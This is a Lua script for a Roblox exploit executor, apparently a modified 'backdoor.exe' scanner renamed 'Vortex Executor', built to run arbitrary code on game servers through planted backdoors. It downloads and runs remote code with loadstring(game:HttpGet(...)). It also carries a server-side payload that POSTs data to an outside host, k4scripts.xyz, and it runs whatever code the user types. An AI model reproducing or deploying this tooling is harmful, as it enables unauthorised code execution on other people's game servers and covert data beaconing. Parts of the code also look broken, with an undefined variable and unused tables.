-- Not Mine!
-- I just edited this script... 

local genv = getgenv();
if genv.backdoorexe then
    genv.backdoorexe.screenGui:Destroy();
end

local screenGui, uiRequire = loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/ui.lua"))()
local alertLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/uniquadev/GuiToLuaConverter/main/PluginPlace/src/alerts.lua"))()

local ui = uiRequire(screenGui.main);
local config = ui.config;
local games = ui.games;
local btns = ui.btns;
local editor = ui.editor;

genv.backdoorexe = {
    screenGui = screenGui,
    ui = ui
};


local httpService = game:GetService("HttpService");
local serverScript = game:GetService("ServerScriptService");
local players = game:GetService("Players");
local localPlayer = players.LocalPlayer;

local MAXTIMEOUT = 20;
local TITLE = "Vortex Executor - V8.0.0";
local BACKDOOR_SOLVER = {};
local BACKDOOR_FILTER = {};
local URSTRING_TO_BACKDOOR = {};
local ALPHABET = {
    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
    "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "=", "+", "[", "]", "{", "}", "|", ";", ":", ",", ".", "?", "/", "`", "~"
};

local EXEC_DEBUG = [[
local BEXE_stdout = {};
local print = function(...)
    table.insert(BEXE_stdout, {
        value = {...}
    });
end;
local warn = function(...)
    table.insert(BEXE_stdout, {
        warn = true,
        value = {...}
    });
end;
local int, err = pcall(function() %s end);
local BEXE = Instance.new("BoolValue");
BEXE.Name = "%s";
BEXE.Value = int;
if not int then
    bool:SetAttribute("err", err);
end;
if #BEXE_stdout > 0 then
    BEXE:SetAttribute(
        "stdout",
        game:GetService("HttpService"):JSONEncode(BEXE_stdout)
    );
end;
BEXE.Parent = workspace;
game:GetService("Debris"):AddItem(BEXE, 3);
]];
-- this code execute on game server, doesn't have any role with user client
local LOG_GAME = [[
if BEXE_LOG == true then return; end;
getfenv()["BEXE_LOG"] = true;

    
local httpService = game:GetService("HttpService");
httpService:RequestAsync(
    {
        Url = "https://k4scripts.xyz/bexe/log",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = httpService:JSONEncode({Data = "%s"})
    }
);
]];

local function applyMacros(code)
    return code:gsub("%%username%%",localPlayer.Name):gsub("%%userid%%",localPlayer.UserId):gsub("%%userping%%",localPlayer:GetNetworkPing()):gsub("%%debug%%",tostring(config.data.settings.canDebug));
end;

btns.execBtn.MouseButton1Click:Connect(function()
    loadstring(applyMacros(editor.getCode()))()
end);

-- set title
ui.title.Text = TITLE;

--alertLib.Success(screenGui, TITLE, 'Backdoor scanner successfully loaded.');
alertLib.Info(screenGui, TITLE, 'Home to toggle ui.', 4);
